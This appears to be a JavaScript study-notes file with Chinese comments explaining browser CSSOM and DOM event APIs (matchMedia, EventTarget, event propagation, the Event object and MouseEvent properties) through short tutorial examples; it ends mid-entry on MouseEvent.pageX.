// CSSStyleRule.selectorText
// 返回当前规则的选择器。 注意，这个属性是可写的
var stylesheet = document.styleSheets[0];
stylesheet.cssRules[0].selectorText // ".myClass"
// CSSStyleRule.style
// 返回一个对象（CSSStyleDeclaration 实例），代表当前规则的样式声明，
// 也就是选择器后面的大括号里面的部分
// SSStyleDeclaration 实例的cssText属性，可以返回所有样式声明，格式为字符串
// HTML 代码为
// <style id="myStyle">
//   p { color: red; }
// </style>
var styleSheet = document.getElementById('myStyle').sheet;
styleSheet.cssRules[0].style instanceof CSSStyleDeclaration // true
styleSheet.cssRules[0].style.cssText // "color: red;"
styleSheet.cssRules[0].selectorText // "p"
// CSSMediaRule 接口 
// 如果一条 CSS 规则是@media代码块，那么它除了 CSSRule 接口，还部署了 CSSMediaRule 接口。
// 该接口主要提供media属性和conditionText属性。
// 前者返回代表@media规则的一个对象（MediaList 实例）
// 后者返回@media规则的生效条件
// HTML 代码如下
// <style id="myStyle">
//   @media screen and (min-width: 900px) {
//     article { display: flex; }
//   }
// </style>
var styleSheet = document.getElementById('myStyle').sheet;
styleSheet.cssRules[0] instanceof CSSMediaRule // true
styleSheet.cssRules[0].media
//  {
//    0: "screen and (min-width: 900px)",
//    appendMedium: function,
//    deleteMedium: function,
//    item: function,
//    length: 1,
//    mediaText: "screen and (min-width: 900px)"
// }
styleSheet.cssRules[0].conditionText // "screen and (min-width: 900px)"
// window.matchMedia()
// 基本用法
// 用来将 CSS 的MediaQuery条件语句，转换成一个 MediaQueryList 实例
// 注意，如果参数不是有效的MediaQuery条件语句，window.matchMedia不会报错，
// 依然返回一个 MediaQueryList 实例。
window.matchMedia('(min-width: 400px)') instanceof MediaQueryList // true
window.matchMedia('bad string') instanceof MediaQueryList // true
// MediaQueryList 接口的实例属性
// 有三个属性
// MediaQueryList.media
// 返回一个字符串，表示对应的 MediaQuery 条件语句
var mql = window.matchMedia('(min-width: 400px)');
mql.media // "(min-width: 400px)"
// MediaQueryList.matches
// 返回一个布尔值，表示当前页面是否符合指定的 MediaQuery 条件语句。
if (window.matchMedia('(min-width: 400px)').matches) {
    /* 当前视口不小于 400 像素 */
} else {
    /* 当前视口小于 400 像素 */
}
// 根据mediaQuery是否匹配当前环境，加载相应的 CSS 样式表
var result = window.matchMedia("(max-width: 700px)");
if (result.matches) {
    var linkElm = document.createElement('link');
    linkElm.setAttribute('rel', 'stylesheet');
    linkElm.setAttribute('type', 'text/css');
    linkElm.setAttribute('href', 'small.css');
    document.head.appendChild(linkElm);
}
// MediaQueryList.onchange
// 如果 MediaQuery 条件语句的适配环境发生变化，会触发change事件。
// onchange属性用来指定change事件的监听函数。
// 该函数的参数是change事件对象（MediaQueryListEvent 实例），
// 该对象与 MediaQueryList 实例类似，也有media和matches属性。
// change事件发生后，存在两种可能。一种是显示宽度从700像素以上变为以下，
// 另一种是从700像素以下变为以上，所以在监听函数内部要判断一下当前是哪一种情况。
var mql = window.matchMedia('(max-width: 600px)');
mql.onchange = function (e) {
    if (e.matches) {
        /* 视口不超过 600 像素 */
    } else {
        /* 视口超过 600 像素 */
    }
}
// MediaQueryList 接口的实例方法
// 两个方法MediaQueryList.addListener()和MediaQueryList.removeListener()，
// 用来为change事件添加或撤销监听函数
var mql = window.matchMedia('(max-width: 600px)');
// 指定监听函数
mql.addListener(mqCallback);
// 撤销监听函数
mql.removeListener(mqCallback);

function mqCallback(e) {
    if (e.matches) {
        /* 视口不超过 600 像素 */
    } else {
        /* 视口超过 600 像素 */
    }
}
// =================================事件=======================================
// EventTarget 接口
// 事件的本质是程序各个组成部分之间的一种通信方式，
// 也是异步编程的一种实现。DOM 支持大量的事件
// 概述
// DOM 的事件操作（监听和触发），都定义在EventTarget接口。
// 所有节点对象都部署了这个接口，其他一些需要事件通信的浏览器内置对象
// （比如，XMLHttpRequest、AudioNode、AudioContext）也部署了这个接口。
// 该接口主要提供三个实例方法。
// addEventListener：绑定事件的监听函数
// removeEventListener：移除事件的监听函数
// dispatchEvent：触发事件
// EventTarget.addEventListener()
// 用于在当前节点或对象上，定义一个特定事件的监听函数。
// 一旦这个事件发生，就会执行监听函数。该方法没有返回值
// 该方法接受三个参数。
// type：事件名称，大小写敏感。
// listener：监听函数。事件发生时，会调用该监听函数。
// useCapture：布尔值，表示监听函数是否在捕获阶段（capture）触发
// 默认为false（监听函数只在冒泡阶段被触发）。该参数可选。
// button节点的addEventListener方法绑定click事件的监听函数hello，
// 该函数只在冒泡阶段触发
function hello() {
    console.log('Hello world');
}
var button = document.getElementById('btn');
button.addEventListener('click', hello, false);
// 关于参数，有两个地方需要注意
// 首先，第二个参数除了监听函数，还可以是一个具有handleEvent方法的对象。
buttonElement.addEventListener('click', {
    handleEvent: function (event) {
        console.log('click');
    }
});
// 其次，第三个参数除了布尔值useCapture，还可以是一个属性配置对象。该对象有以下属性。
// capture：布尔值，表示该事件是否在捕获阶段触发监听函数。
// once：布尔值，表示监听函数是否只触发一次，然后就自动移除。
// passive：布尔值，表示监听函数不会调用事件的preventDefault方法。
// 如果监听函数调用了，浏览器将忽略这个要求，并在监控台输出一行警告。
// 如果希望事件监听函数只执行一次，可以打开属性配置对象的once属性
element.addEventListener('click', function (event) {
    // 只执行一次的代码
}, {
    once: true
});
//   addEventListener方法可以为针对当前对象的同一个事件，添加多个不同的监听函数。
//   这些函数按照添加顺序触发，即先添加先触发。如果为同一个事件多次添加同一个监听函数，
//   该函数只会执行一次，多余的添加将自动被去除（不必使用removeEventListener方法手动去除）
// 如果希望向监听函数传递参数，可以用匿名函数包装一下监听函数。
function print(x) {
    console.log(x);
}
var el = document.getElementById('div1');
el.addEventListener('click', function () {
    print('Hello');
}, false);
// 监听函数内部的this，指向当前事件所在的那个对象
// 监听函数内部的this指向事件所在的对象para
// <p id="para">Hello</p>
var para = document.getElementById('para');
para.addEventListener('click', function (e) {
    console.log(this.nodeName); // "P"
}, false);
// EventTarget.removeEventListener()
// 用来移除addEventListener方法添加的事件监听函数。该方法没有返回值。
// 注意，removeEventListener方法移除的监听函数，必须是addEventListener方法
// 添加的那个监听函数，而且必须在同一个元素节点，否则无效
div.addEventListener('click', listener, false);
div.removeEventListener('click', listener, false);
// 下面的代码中removeEventListener方法无效，因为监听函数不是同一个匿名函数
div.addEventListener('click', function (e) {}, false);
div.removeEventListener('click', function (e) {}, false);
// EventTarget.dispatchEvent()
// 在当前节点上触发指定事件，从而触发监听函数的执行
// dispatchEvent方法的参数是一个Event对象的实例
// 如果dispatchEvent方法的参数为空，或者不是一个有效的事件对象，将报错
// 在当前节点触发了click事件
para.addEventListener('click', hello, false);
var event = new Event('click');
para.dispatchEvent(event);
// =====
// 事件模型
// 监听函数
// 浏览器的事件模型，就是通过监听函数（listener）对事件做出反应。
// 事件发生后，浏览器监听到了这个事件，就会执行对应的监听函数。
// 这是事件驱动编程模式（event-driven）的主要编程方式。
// JavaScript 有三种方法，可以为事件绑定监听函数
// HTML 的 on- 属性
// 注意，这些属性的值是将会执行的代码，而不是一个函数
// 一旦指定的事件发生，on-属性的值是原样传入 JavaScript 引擎执行。
// 因此如果要执行函数，不要忘记加上一对圆括号。
// 使用这个方法指定的监听代码，只会在冒泡阶段触发
// 直接设置on-属性，与通过元素节点的setAttribute方法设置on-属性，效果是一样的。
// <Element onclick="doSomething()">
// 等同于
el.setAttribute('onclick', 'doSomething()');
// 元素节点的事件属性
// 元素节点对象的事件属性，同样可以指定监听函数。
// 使用这个方法指定的监听函数，也是只会在冒泡阶段触发。
// 注意，这种方法与 HTML 的on-属性的差异是，它的值是函数名（doSomething），
// 而不像后者，必须给出完整的监听代码（doSomething()）。
window.onload = doSomething;
div.onclick = function (event) {
    console.log('触发事件');
};
// EventTarget.addEventListener()
// 所有 DOM 节点实例都有addEventListener方法，用来为该节点定义事件的监听函数。
window.addEventListener('load', doSomething, false);
// 小结
// 第一种“HTML 的 on- 属性”
// 违反了 HTML 与 JavaScript 代码相分离的原则，将两者写在一起，不利于代码分工，
// 因此不推荐使用。
// 第二种“元素节点的事件属性”的缺点在于
// 同一个事件只能定义一个监听函数，也就是说，如果定义两次onclick属性，
// 后一次定义会覆盖前一次。因此，也不推荐使用。
// 第三种EventTarget.addEventListener
// 推荐的指定监听函数的方法。它有如下优点：
// 同一个事件可以添加多个监听函数。
// 能够指定在哪个阶段（捕获阶段还是冒泡阶段）触发监听函数。
// 除了 DOM 节点，其他对象（比如window、XMLHttpRequest等）也有这个接口，
// 它等于是整个 JavaScript 统一的监听函数接口。
// this 的指向
// 监听函数内部的this指向触发事件的那个元素节点。
// 执行代码，点击后会输出btn。
{
    /* <button id = "btn"onclick = "console.log(this.id)" > 点击 </button> */
}
// 其他两种监听函数的写法，this的指向也是如此
// <button id="btn">点击</button>
var btn = document.getElementById('btn');
// 写法一
btn.onclick = function () {
    console.log(this.id);
};
// 写法二
btn.addEventListener('click', function (e) {
    console.log(this.id);
}, false);
// 事件的传播
// 一个事件发生后，会在子元素和父元素之间传播（propagation）。这种传播分成三个阶段。
// 第一阶段：从window对象传导到目标节点（上层传到底层），称为“捕获阶段”（capture phase）。
// 第二阶段：在目标节点上触发，称为“目标阶段”（target phase）。
// 第三阶段：从目标节点传导回window对象（从底层传回上层），称为“冒泡阶段”（bubbling phase）。
// 这种三阶段的传播模型，使得同一个事件会在多个节点上触发。
// 如果对这两个节点，都设置click事件的监听函数（每个节点的捕获阶段和监听阶段，
// 各设置一个监听函数），共计设置四个监听函数。然后，对<p>点击，click事件会触发四次。
{
    /* <div>
      <p>点击</p>
    </div> */
}
var phases = {
    1: 'capture',
    2: 'target',
    3: 'bubble'
};
var div = document.querySelector('div');
var p = document.querySelector('p');
div.addEventListener('click', callback, true);
p.addEventListener('click', callback, true);
div.addEventListener('click', callback, false);
p.addEventListener('click', callback, false);

function callback(event) {
    var tag = event.currentTarget.tagName;
    var phase = phases[event.eventPhase];
    console.log("Tag: '" + tag + "'. EventPhase: '" + phase + "'");
}
// 点击以后的结果
// Tag: 'DIV'. EventPhase: 'capture'
// Tag: 'P'. EventPhase: 'target'
// Tag: 'P'. EventPhase: 'target'
// Tag: 'DIV'. EventPhase: 'bubble'
// click事件被触发了四次：<div>节点的捕获阶段和冒泡阶段各1次，<p>节点的目标阶段触发了2次。
// 捕获阶段：事件从<div>向<p>传播时，触发<div>的click事件；
// 目标阶段：事件从<div>到达<p>时，触发<p>的click事件；
// 冒泡阶段：事件从<p>传回<div>时，再次触发<div>的click事件。
// 其中，<p>节点有两个监听函数（addEventListener方法第三个参数的不同，
// 会导致绑定两个监听函数），因此它们都会因为click事件触发一次。
// 所以，<p>会在target阶段有两次输出。
// 注意，浏览器总是假定click事件的目标节点，就是点击位置嵌套最深的那个节点
// （本例是<div>节点里面的<p>节点）。所以，<p>节点的捕获阶段和冒泡阶段，
// 都会显示为target阶段。
// 事件传播的最上层对象是window，接着依次是document，
// html（document.documentElement）和body（document.body）。
// 也就是说，上例的事件传播顺序，
// 在捕获阶段依次为window、document、html、body、div、p，
// 在冒泡阶段依次为p、div、body、html、document、window
// 事件的代理
// 由于事件会在冒泡阶段向上传播到父节点，因此可以把子节点的监听函数定义在父节点上，
// 由父节点的监听函数统一处理多个子元素的事件。这种方法叫做事件的代理（delegation）。
// click事件的监听函数定义在<ul>节点，但是实际上，它处理的是子节点<li>的click事件。
// 这样做的好处是，只要定义一个监听函数，就能处理多个子节点的事件，
// 而不用在每个<li>节点上定义监听函数。而且以后再添加子节点，监听函数依然有效。
var ul = document.querySelector('ul');
ul.addEventListener('click', function (event) {
    if (event.target.tagName.toLowerCase() === 'li') {
        // some code
    }
});
// 如果希望事件到某个节点为止，不再传播，可以使用事件对象的stopPropagation方法。
// stopPropagation方法分别在捕获阶段和冒泡阶段，阻止了事件的传播
// 事件传播到 p 元素后，就不再向下传播了
p.addEventListener('click', function (event) {
    event.stopPropagation();
}, true);

// 事件冒泡到 p 元素后，就不再向上冒泡了
p.addEventListener('click', function (event) {
    event.stopPropagation();
}, false);
// 但是，stopPropagation方法只会阻止事件的传播，不会
// 阻止该事件触发<p>节点的其他click事件的监听函数。也就是说，不是彻底取消click事件
// p元素绑定了两个click事件的监听函数。stopPropagation方法只能阻止这个事件的传播，
// 不能取消这个事件，因此，第二个监听函数会触发。输出结果会先是1，然后是2
p.addEventListener('click', function (event) {
    event.stopPropagation();
    //  会输出
    console.log(1);
});

p.addEventListener('click', function (event) {
    // 会输出
    console.log(2);
});
//   如果想要彻底取消该事件，不再触发后面所有click的监听函数，
// 可以使用stopImmediatePropagation方法
// stopImmediatePropagation方法可以彻底取消这个事件，
// 使得后面绑定的所有click监听函数都不再触发。所以，只会输出1，不会输出2
p.addEventListener('click', function (event) {
    event.stopImmediatePropagation();
    console.log(1);
});
p.addEventListener('click', function (event) {
    // 不会被触发
    console.log(2);
});
// Event 对象
// 概述
// 事件发生以后，会产生一个事件对象，作为参数传给监听函数。
// 浏览器原生提供一个Event对象，所有的事件都是这个对象的实例，
// 或者说继承了Event.prototype对象。
// Event对象本身就是一个构造函数，可以用来生成新的实例。
// Event构造函数接受两个参数。第一个参数type是字符串，表示事件的名称；
// 第二个参数options是一个对象，表示事件对象的配置。
// 该对象主要有下面两个属性。
// bubbles：布尔值，可选，默认为false，表示事件对象是否冒泡。
// cancelable：布尔值，可选，默认为false，表示事件是否可以被取消，
// 即能否用Event.preventDefault()取消这个事件。
// 一旦事件被取消，就好像从来没有发生过，不会触发浏览器对该事件的默认行为。
// 注意，如果不是显式指定bubbles属性为true，生成的事件就只能在“捕获阶段”触发监听函数。
// 新建一个look事件实例，然后使用dispatchEvent方法触发该事件
var ev = new Event(
    'look', {
        'bubbles': true,
        'cancelable': false
    }
);
document.dispatchEvent(ev);
// p元素发出一个click事件，该事件默认不会冒泡。div.addEventListener方法
// 指定在冒泡阶段监听，因此监听函数不会触发。如果
// 写成div.addEventListener('click', callback, true)，那么
// 在“捕获阶段”可以监听到这个事件。
// <div><p>Hello</p></div>
var div = document.querySelector('div');
var p = document.querySelector('p');

function callback(event) {
    var tag = event.currentTarget.tagName;
    console.log('Tag: ' + tag); // 没有任何输出
}
div.addEventListener('click', callback, false);
var click = new Event('click');
p.dispatchEvent(click);
// 另一方面，如果这个事件在div元素上触发。那么，不管div元素是在冒泡阶段监听，
// 还是在捕获阶段监听，都会触发监听函数。因为这时div元素是事件的目标，
// 不存在是否冒泡的问题，div元素总是会接收到事件，因此导致监听函数生效
div.dispatchEvent(click);
// 实例属性
// Event.bubbles，Event.eventPhase
// Event.bubbles属性返回一个布尔值，表示当前事件是否会冒泡。
// 该属性为只读属性，一般用来了解 Event 实例是否可以冒泡。
// 前面说过，除非显式声明，Event构造函数生成的事件，默认是不冒泡的
// Event.eventPhase属性返回一个整数常量，表示事件目前所处的阶段。该属性只读。
// Event.eventPhase的返回值有四种可能。
// 0，事件目前没有发生。
// 1，事件目前处于捕获阶段，即处于从祖先节点向目标节点的传播过程中。
// 2，事件到达目标节点，即Event.target属性指向的那个节点。
// 3，事件处于冒泡阶段，即处于从目标节点向祖先节点的反向传播过程中
// Event.cancelable，Event.cancelBubble，event.defaultPrevented
// Event.cancelable属性返回一个布尔值，表示事件是否可以取消。
// 该属性为只读属性，一般用来了解 Event 实例的特性
// 大多数浏览器的原生事件是可以取消的。比如，取消click事件，点击链接将无效。
// 但是除非显式声明，Event构造函数生成的事件，默认是不可以取消的。
// 当Event.cancelable属性为true时，调用Event.preventDefault()就可以
// 取消这个事件，阻止浏览器对该事件的默认行为
// 如果事件不能取消，调用Event.preventDefault()会没有任何效果。所以使用这个方法之前，
// 最好用Event.cancelable属性判断一下是否可以取消
function preventEvent(event) {
    if (event.cancelable) {
        event.preventDefault();
    } else {
        console.warn('This event couldn\'t be canceled.');
        console.dir(event);
    }
}
// Event.cancelBubble属性是一个布尔值，如果设为true，
// 相当于执行Event.stopPropagation()，可以阻止事件的传播。
// Event.defaultPrevented属性返回一个布尔值，
// 表示该事件是否调用过Event.preventDefault方法。该属性只读。
if (event.defaultPrevented) {
    console.log('该事件已经取消了');
}
// Event.currentTarget，Event.target
// Event.currentTarget属性返回事件当前所在的节点，即正在执行的监听函数所绑定的那个节点。
// Event.target属性返回原始触发事件的那个节点，即事件最初发生的节点。
// 事件传播过程中，不同节点的监听函数内部的Event.target与Event.currentTarget属性
// 的值是不一样的，前者总是不变的，后者则是指向监听函数所在的那个节点对象。
// <p id="para">Hello <em>World</em></p>
function hide(e) {
    console.log(this === e.currentTarget); // 总是 true
    console.log(this === e.target); // 有可能不是 true
    e.target.style.visibility = 'hidden';
}
para.addEventListener('click', hide, false);
// 如果在para节点的<em>子节点上面点击，则e.target指向<em>子节点，导致<em>子节点
// （即 World 部分）会不可见。如果点击 Hello 部分，则整个para都将不可见
// Event.type
// 返回一个字符串，表示事件类型。事件的类型是在生成事件的时候指定的。该属性只读。
var evt = new Event('foo');
evt.type // "foo"
// Event.timeStamp
// 返回一个毫秒时间戳，表示事件发生的时间。它是相对于网页加载成功开始计算的。
// 它的返回值有可能是整数，也有可能是小数（高精度时间戳），取决于浏览器的设置
var evt = new Event('foo');
evt.timeStamp // 3683.6999999995896
// 计算鼠标移动速度的例子，显示每秒移动的像素数量
var previousX;
var previousY;
var previousT;
window.addEventListener('mousemove', function (event) {
    if (
        previousX !== undefined &&
        previousY !== undefined &&
        previousT !== undefined
    ) {
        var deltaX = event.screenX - previousX;
        var deltaY = event.screenY - previousY;
        var deltaD = Math.sqrt(Math.pow(deltaX, 2) + Math.pow(deltaY, 2));

        var deltaT = event.timeStamp - previousT;
        console.log(deltaD / deltaT * 1000);
    }
    previousX = event.screenX;
    previousY = event.screenY;
    previousT = event.timeStamp;
});
// Event.isTrusted
// 返回一个布尔值，表示该事件是否由真实的用户行为产生。
// 比如，用户点击链接会产生一个click事件，该事件是用户产生的；
// Event构造函数生成的事件，则是脚本产生的。
// evt对象是脚本产生的，所以isTrusted属性返回false
var evt = new Event('foo');
evt.isTrusted // false
// Event.detail
//只有浏览器的 UI （用户界面）事件才具有。
// 该属性返回一个数值，表示事件的某种信息。
// 具体含义与事件类型相关。
// 比如，对于click和dblclick事件，
// Event.detail是鼠标按下的次数（1表示单击，2表示双击，3表示三击）；
// 对于鼠标滚轮事件，
// Event.detail是滚轮正向滚动的距离，负值就是负向滚动的距离，返回值总是3的倍数。
// <p>Hello</p>
function giveDetails(e) {
    console.log(e.detail);
}
document.querySelector('p').onclick = giveDetails;
// 实例方法
// Event.preventDefault()
// 取消浏览器对当前事件的默认行为。
// 比如点击链接后，浏览器默认会跳转到另一个页面，使用这个方法以后，就不会跳转了；
// 再比如，按一下空格键，页面向下滚动一段距离，使用这个方法以后也不会滚动了。
// 该方法生效的前提是，事件对象的cancelable属性为true，
// 如果为false，调用该方法没有任何效果。
// 注意，该方法只是取消事件对当前元素的默认影响，不会阻止事件的传播
// 浏览器的默认行为是单击会选中单选框，取消这个行为，就导致无法选中单选框。
// <input type="checkbox" id="my-checkbox" />
var cb = document.getElementById('my-checkbox');
cb.addEventListener(
    'click',
    function (e) {
        e.preventDefault();
    },
    false
);
// 利用这个方法，可以为文本输入框设置校验条件。
// 如果用户的输入不符合条件，就无法将字符输入文本框
// 为文本框的keypress事件设定监听函数后，将只能输入小写字母，
// 否则输入事件的默认行为（写入文本框）将被取消，导致不能向文本框输入内容
// <input type="text" id="my-input" />
var input = document.getElementById('my-input');
input.addEventListener('keypress', checkName, false);

function checkName(e) {
    if (e.charCode < 97 || e.charCode > 122) {
        e.preventDefault();
    }
}
// Event.stopPropagation()
// 阻止事件在 DOM 中继续传播，防止再触发定义在别的节点上的监听函数，
// 但是不包括在当前节点上其他的事件监听函数
// 上面代码中，click事件将不会进一步冒泡到el节点的父节点
function stopEvent(e) {
    e.stopPropagation();
}
el.addEventListener('click', stopEvent, false);
// Event.stopImmediatePropagation()
// 阻止同一个事件的其他监听函数被调用，不管监听函数定义在当前节点还是其他节点。
// 也就是说，该方法阻止事件的传播，比Event.stopPropagation()更彻底。
// 如果同一个节点对于同一个事件指定了多个监听函数，这些函数会根据添加的顺序依次调用。
// 只要其中有一个监听函数调用了Event.stopImmediatePropagation方法，
// 其他的监听函数就不会再执行了。
// 在el节点上，为click事件添加了两个监听函数l1和l2。
// 由于l1调用了event.stopImmediatePropagation方法，所以l2不会被调用
function l1(e) {
    e.stopImmediatePropagation();
}

function l2(e) {
    console.log('hello world');
}
el.addEventListener('click', l1, false);
el.addEventListener('click', l2, false);
// Event.composedPath()
// 返回一个数组，成员是事件的最底层节点和依次冒泡经过的所有上层节点。
// click事件的最底层节点是p，向上依次是div、body、html、document、Window。
// <div>
//   <p>Hello</p>
// </div>
var div = document.querySelector('div');
var p = document.querySelector('p');
div.addEventListener('click', function (e) {
    console.log(e.composedPath());
}, false);
// [p, div, body, html, document, Window]
//=====
// 鼠标事件
// 鼠标事件的种类
// 鼠标事件指与鼠标相关的事件，继承了MouseEvent接口。具体的事件主要有以下一些。
// click：按下鼠标（通常是按下主按钮）时触发。
// dblclick：在同一个元素上双击鼠标时触发。
// mousedown：按下鼠标键时触发。
// mouseup：释放按下的鼠标键时触发。
// mousemove：当鼠标在一个节点内部移动时触发。当鼠标持续移动时，
// 该事件会连续触发。为了避免性能问题，建议对该事件的监听函数做一些限定，
// 比如限定一段时间内只能运行一次。
// mouseenter：鼠标进入一个节点时触发，进入子节点不会触发这个事件。
// mouseover：鼠标进入一个节点时触发，进入子节点会再一次触发这个事件。
// mouseout：鼠标离开一个节点时触发，离开父节点也会触发这个事件。
// mouseleave：鼠标离开一个节点时触发，离开父节点不会触发这个事件。
// contextmenu：按下鼠标右键时（上下文菜单出现前）触发，或者按下“上下文菜单键”时触发。
// wheel：滚动鼠标的滚轮时触发，该事件继承的是WheelEvent接口。
// click事件指的是，用户在同一个位置先完成mousedown动作，再完成mouseup动作。
// 因此，触发顺序是，mousedown首先触发，mouseup接着触发，click最后触发。
// dblclick事件则会在mousedown、mouseup、click之后触发。
// mouseover事件和mouseenter事件，都是鼠标进入一个节点时触发。
// 两者的区别是，mouseenter事件只触发一次，而只要鼠标在节点内部移动，
// mouseover事件会在子节点上触发多次。
// 在父节点内部进入子节点，不会触发mouseenter事件，但是会触发mouseover事件
{
    /* <ul>
    <li>item 1</li>
    <li>item 2</li>
    <li>item 3</li>
    </ul> */
}

var ul = document.querySelector('ul');

// 进入 ul 节点以后，mouseenter 事件只会触发一次
// 以后只要鼠标在节点内移动，都不会再触发这个事件
// event.target 是 ul 节点
ul.addEventListener('mouseenter', function (event) {
    event.target.style.color = 'purple';
    setTimeout(function () {
        event.target.style.color = '';
    }, 500);
}, false);

// 进入 ul 节点以后，只要在子节点上移动，mouseover 事件会触发多次
// event.target 是 li 节点
ul.addEventListener('mouseover', function (event) {
    event.target.style.color = 'orange';
    setTimeout(function () {
        event.target.style.color = '';
    }, 500);
}, false);
// mouseout事件和mouseleave事件，都是鼠标离开一个节点时触发。两者的区别是，
// 在父元素内部离开一个子元素时，mouseleave事件不会触发，而mouseout事件会触发。
// 在父节点内部离开子节点，不会触发mouseleave事件，但是会触发mouseout事件
/* HTML 代码如下
 <ul>
   <li>item 1</li>
   <li>item 2</li>
  <li>item 3</li>
 </ul>
*/

var ul = document.querySelector('ul');

// 先进入 ul 节点，然后在节点内部移动，不会触发 mouseleave 事件
// 只有离开 ul 节点时，触发一次 mouseleave
// event.target 是 ul 节点
ul.addEventListener('mouseleave', function (event) {
    event.target.style.color = 'purple';
    setTimeout(function () {
        event.target.style.color = '';
    }, 500);
}, false);

// 先进入 ul 节点，然后在节点内部移动，mouseout 事件会触发多次
// event.target 是 li 节点
ul.addEventListener('mouseout', function (event) {
    event.target.style.color = 'orange';
    setTimeout(function () {
        event.target.style.color = '';
    }, 500);
}, false);
// MouseEvent 接口概述
// MouseEvent接口代表了鼠标相关的事件，单击（click）、双击（dblclick）、
// 松开鼠标键（mouseup）、按下鼠标键（mousedown）等动作，
// 所产生的事件对象都是MouseEvent实例。此外，滚轮事件和拖拉事件也是MouseEvent实例。
// MouseEvent接口继承了Event接口，所以拥有Event的所有属性和方法。它还有自己的属性和方法。
// 浏览器原生提供一个MouseEvent构造函数，用于新建一个MouseEvent实例。
// var event = new MouseEvent(type, options);
// MouseEvent构造函数接受两个参数。第一个参数是字符串，表示事件名称；
// 第二个参数是一个事件配置对象，该参数可选。
// 除了Event接口的实例配置属性，该对象可以配置以下属性，所有属性都是可选的。
// screenX：数值，鼠标相对于屏幕的水平位置（单位像素），默认值为0，设置该属性不会移动鼠标。
// screenY：数值，鼠标相对于屏幕的垂直位置（单位像素），其他与screenX相同。
// clientX：数值，鼠标相对于程序窗口的水平位置（单位像素），默认值为0，设置该属性不会移动鼠标。
// clientY：数值，鼠标相对于程序窗口的垂直位置（单位像素），其他与clientX相同。
// ctrlKey：布尔值，是否同时按下了 Ctrl 键，默认值为false。
// shiftKey：布尔值，是否同时按下了 Shift 键，默认值为false。
// altKey：布尔值，是否同时按下 Alt 键，默认值为false。
// metaKey：布尔值，是否同时按下 Meta 键，默认值为false。
// button：数值，表示按下了哪一个鼠标按键，默认值为0，表示按下主键（通常是鼠标的左键）或者当前事件没有定义这个属性；1表示按下辅助键（通常是鼠标的中间键），2表示按下次要键（通常是鼠标的右键）。
// buttons：数值，表示按下了鼠标的哪些键，是一个三个比特位的二进制值，默认为0（没有按下任何键）。1（二进制001）表示按下主键（通常是左键），2（二进制010）表示按下次要键（通常是右键），4（二进制100）表示按下辅助键（通常是中间键）。因此，如果返回3（二进制011）就表示同时按下了左键和右键。
// relatedTarget：节点对象，表示事件的相关节点，默认为null。mouseenter和mouseover事件时，表示鼠标刚刚离开的那个元素节点；mouseout和mouseleave事件时，表示鼠标正在进入的那个元素节点。
// 生成一个鼠标点击事件，并触发该事件
function simulateClick() {
    var event = new MouseEvent('click', {
        'bubbles': true,
        'cancelable': true
    });
    var cb = document.getElementById('checkbox');
    cb.dispatchEvent(event);
}
// MouseEvent 接口的实例属性
// MouseEvent.altKey，MouseEvent.ctrlKey，MouseEvent.metaKey，MouseEvent.shiftKey
// 都返回一个布尔值，表示事件发生时，是否按下对应的键。它们都是只读属性。
// altKey属性：Alt 键
// ctrlKey属性：Ctrl 键
// metaKey属性：Meta 键（Mac 键盘是一个四瓣的小花，Windows 键盘是 Windows 键）
// shiftKey属性：Shift 键
// 点击网页会输出是否同时按下对应的键。
// <body onclick="showKey(event)">
function showKey(e) {
    console.log('ALT key pressed: ' + e.altKey);
    console.log('CTRL key pressed: ' + e.ctrlKey);
    console.log('META key pressed: ' + e.metaKey);
    console.log('SHIFT key pressed: ' + e.shiftKey);
}
// MouseEvent.button，MouseEvent.buttons
// MouseEvent.button属性返回一个数值，表示事件发生时按下了鼠标的哪个键。该属性只读。
// 0：按下主键（通常是左键），或者该事件没有初始化这个属性（比如mousemove事件）。
// 1：按下辅助键（通常是中键或者滚轮键）。
// 2：按下次键（通常是右键）。
// <button onmouseup="whichButton(event)">点击</button>
var whichButton = function (e) {
    switch (e.button) {
        case 0:
            console.log('Left button clicked.');
            break;
        case 1:
            console.log('Middle button clicked.');
            break;
        case 2:
            console.log('Right button clicked.');
            break;
        default:
            console.log('Unexpected code: ' + e.button);
    }
}
// MouseEvent.buttons属性返回一个三个比特位的值，表示同时按下了哪些键。
// 它用来处理同时按下多个鼠标键的情况。该属性只读。
// 1：二进制为001（十进制的1），表示按下左键。
// 2：二进制为010（十进制的2），表示按下右键。
// 4：二进制为100（十进制的4），表示按下中键或滚轮键。
// 同时按下多个键的时候，每个按下的键对应的比特位都会有值。
// 比如，同时按下左键和右键，会返回3（二进制为011）。
// MouseEvent.clientX，MouseEvent.clientY
// MouseEvent.clientX属性返回鼠标位置相对于浏览器窗口左上角的水平坐标（单位像素），
// MouseEvent.clientY属性返回垂直坐标。这两个属性都是只读属性
// 这两个属性还分别有一个别名MouseEvent.x和MouseEvent.y
// <body onmousedown="showCoords(event)">
function showCoords(evt) {
    console.log(
        'clientX value: ' + evt.clientX + '\n' +
        'clientY value: ' + evt.clientY + '\n'
    );
}
//   MouseEvent.movementX，MouseEvent.movementY
// MouseEvent.movementX属性返回当前位置与上一个mousemove事件之间的水平距离（单位像素）。
// 数值上，它等于下面的计算公式。
// currentEvent.movementX = currentEvent.screenX - previousEvent.screenX
// MouseEvent.movementY属性返回当前位置与上一个mousemove事件之间的垂直距离（单位像素）。
// 数值上，它等于下面的计算公式。
// currentEvent.movementY = currentEvent.screenY - previousEvent.screenY。
// 这两个属性都是只读属性。
// MouseEvent.screenX，MouseEvent.screenY
// MouseEvent.screenX属性返回鼠标位置相对于屏幕左上角的水平坐标（单位像素），
// MouseEvent.screenY属性返回垂直坐标。这两个属性都是只读属性。
// <body onmousedown="showCoords(event)">
function showCoords(evt) {
    console.log(
        'screenX value: ' + evt.screenX + '\n',
        'screenY value: ' + evt.screenY + '\n'
    );
}
// MouseEvent.offsetX，MouseEvent.offsetY 
// MouseEvent.offsetX属性返回鼠标位置与目标节点左侧的padding边缘的水平距离（单位像素），
// MouseEvent.offsetY属性返回与目标节点上方的padding边缘的垂直距离。
// 这两个属性都是只读属性。
// 鼠标如果在p元素的中心位置点击，会返回150 150。
// 因此中心位置距离左侧和上方的padding边缘，等于padding的宽度（100像素）
// 加上元素内容区域一半的宽度（50像素）。
/* HTML 代码如下
  <style>
    p {
      width: 100px;
      height: 100px;
      padding: 100px;
    }
  </style>
  <p>Hello</p>
*/
var p = document.querySelector('p');
p.addEventListener(
    'click',
    function (e) {
        console.log(e.offsetX);
        console.log(e.offsetY);
    },
    false
);
// MouseEvent.pageX，MouseEvent.pageY
// MouseEvent.pageX属性返回鼠标位置与文档左侧边缘的距离（单位像素），
